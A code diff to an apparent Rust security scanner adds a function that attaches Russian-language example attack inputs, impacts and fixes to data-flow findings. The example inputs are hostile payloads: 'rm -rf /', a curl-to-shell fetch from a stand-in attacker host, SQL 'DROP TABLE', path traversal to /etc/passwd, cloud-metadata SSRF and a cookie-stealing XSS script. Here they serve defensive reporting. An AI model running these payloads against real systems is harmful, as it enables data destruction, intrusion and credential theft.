@@ -423,6 +423,9 @@ fn scan_one_file(
             // Where the untrusted data enters, so the source step and the
             // attack-paths panel name the real entry point, not "user input".
             let entry = flow.entry_kind();
+            // A concrete attack input, its consequences, and how to break the
+            // flow — specific to the category this path reached.
+            let (exploit, impact, fix_code) = flow_advice(flow.category);
             let steps: Vec<CombineSpot> = flow
                 .steps
                 .iter()
@@ -486,6 +489,9 @@ fn scan_one_file(
                 extra: Some(FindingExtra {
                     flow: steps,
                     entry: Some(entry.to_string()),
+                    exploit,
+                    impact,
+                    fix_code,
                     ..Default::default()
                 }),
                 package: None,
@@ -550,9 +556,9 @@ fn scan_one_file(
                 owasp: None,
                 cve: Vec::new(),
                 references: Vec::new(),
-                extra: Some(FindingExtra {
-                    flow: steps,
-                    ..Default::default()
+                extra: Some({
+                    let (exploit, impact, fix_code) = flow_advice(flow.category);
+                    FindingExtra { flow: steps, exploit, impact, fix_code, ..Default::default() }
                 }),
                 package: None,
             });
@@ -1306,6 +1312,63 @@ fn mark_reachable_findings(findings: &mut [Finding]) {
             f.extra.get_or_insert_with(FindingExtra::default).on_data_path = true;
         }
     }
+}
+
+/// Concrete exploitation, impact and a fix for a traced data-flow finding,
+/// keyed by the sink category. A pattern rule can only speak in generalities;
+/// a flow finding knows the exact category it reached, so it can hand the
+/// reviewer a copy-paste attack input, the consequences, and how to break it.
+/// Returns (exploit, impact bullets, fix snippet). Russian text goes through the
+/// UI's `t()`; the fix is code, shown as-is.
+fn flow_advice(category: &str) -> (Option<String>, Vec<String>, Option<String>) {
+    let (exploit, impact, fix): (&str, &[&str], &str) = match category {
+        "SQL-инъекция" => (
+            "Ввод «' OR '1'='1' -- » превращает условие в всегда-истинное и выдаёт все строки; «'; DROP TABLE users; --» разрушает данные.",
+            &["Чтение любых данных из базы", "Изменение или удаление данных", "Обход аутентификации"],
+            "cursor.execute(\"SELECT * FROM users WHERE name = ?\", (name,))  # parameterized, no string building",
+        ),
+        "Инъекция команд" => (
+            "Ввод «; rm -rf / » или «$(curl attacker/x|sh)» выполняет произвольные команды ОС.",
+            &["Выполнение произвольных команд на сервере", "Полная компрометация хоста"],
+            "subprocess.run([\"ls\", user_dir], shell=False)  # argv array, never a shell string",
+        ),
+        "Path traversal" => (
+            "Ввод «../../../../etc/passwd» выходит за пределы каталога и читает системные файлы.",
+            &["Чтение произвольных файлов", "Раскрытие конфигов, ключей и исходников"],
+            "p = os.path.realpath(os.path.join(base, name))\nassert p.startswith(base + os.sep)  # stay inside base",
+        ),
+        "SSRF" => (
+            "Ввод «http://169.254.169.254/latest/meta-data/» заставляет сервер обратиться к метаданным облака.",
+            &["Доступ к внутренним сервисам", "Кража облачных учётных данных", "Обход сетевого периметра"],
+            "host = urlparse(url).hostname\nassert host in ALLOWED_HOSTS  # allowlist; block private ranges",
+        ),
+        "Выполнение кода" => (
+            "Ввод «__import__('os').system('id')» исполняется как код приложения.",
+            &["Выполнение произвольного кода", "Полная компрометация приложения"],
+            "data = json.loads(text)  # a safe parser instead of eval/exec/pickle",
+        ),
+        "XSS" => (
+            "Ввод «<script>fetch('//attacker/'+document.cookie)</script>» крадёт cookie в браузере жертвы.",
+            &["Кража сессий и токенов", "Действия от имени пользователя", "Подмена содержимого страницы"],
+            "el.textContent = value;  // set text, not innerHTML; or escape before inserting HTML",
+        ),
+        "Открытый редирект" => (
+            "Ввод «https://evil.example» уводит пользователя на сайт злоумышленника для фишинга.",
+            &["Фишинг с доверенного домена", "Угон OAuth-редиректов"],
+            "if not is_relative(dest): dest = \"/\"  # allow only relative paths, or match host to an allowlist",
+        ),
+        "Утечка чувствительных данных" => (
+            "Значение секрета в логе или ответе видит каждый, у кого есть доступ к журналам, их системе сбора или к трафику.",
+            &["Раскрытие паролей, токенов и ключей", "Утечка в хранилища логов и третьим лицам"],
+            "logger.info(\"user %s authenticated\", user.name)  # log an identifier, never the secret",
+        ),
+        _ => ("", &[], ""),
+    };
+    (
+        (!exploit.is_empty()).then(|| exploit.to_string()),
+        impact.iter().map(|s| s.to_string()).collect(),
+        (!fix.is_empty()).then(|| fix.to_string()),
+    )
 }
 
 /// Identifiers that name the same underlying vulnerability: the advisory's own
